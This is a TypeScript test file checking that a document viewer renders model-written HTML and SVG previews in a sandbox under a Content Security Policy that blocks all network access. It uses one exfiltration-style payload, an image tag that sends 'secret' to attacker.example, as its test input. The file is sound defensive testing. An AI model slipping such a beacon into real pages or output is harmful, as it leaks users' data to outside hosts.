/**
 * A previewed HTML page or SVG is written by a model, which may have been
 * steered by what it read: it renders in a sandbox, with no reach to the
 * network, and only a code document gets a preview at all.
 */

import { describe, expect, it, vi } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";

// The viewer's other views, which the preview does not use.
vi.mock("@/components/ui/ai-code-block", () => ({ CodeBlock: () => null }));
vi.mock("@/components/ui/ai-markdown", () => ({ Markdown: () => null }));

const { HtmlPreview, PREVIEW_CSP, isPreviewableTitle } =
  await import("../base/ui/document-viewer/document-viewer");

describe("HtmlPreview", () => {
  const html = renderToStaticMarkup(
    <HtmlPreview
      content={'<img src="https://attacker.example/p?d=secret">'}
      title="page.html"
    />
  );

  it("runs scripts only in an opaque origin", () => {
    expect(html).toContain('sandbox="allow-scripts"');
    expect(html).not.toContain("allow-same-origin");
  });

  it("puts the page under a policy that reaches no server", () => {
    expect(html).toContain("Content-Security-Policy");
    expect(PREVIEW_CSP).toContain("default-src 'none'");
    expect(PREVIEW_CSP).toMatch(/img-src data: blob:(;|$)/);
    expect(PREVIEW_CSP).not.toMatch(/https?:|\*/);
  });
});

describe("isPreviewableTitle", () => {
  it("names the extensions with a rendered form", () => {
    expect(isPreviewableTitle("page.html")).toBe(true);
    expect(isPreviewableTitle("logo.SVG")).toBe(true);
    expect(isPreviewableTitle("notes.md")).toBe(false);
  });
});
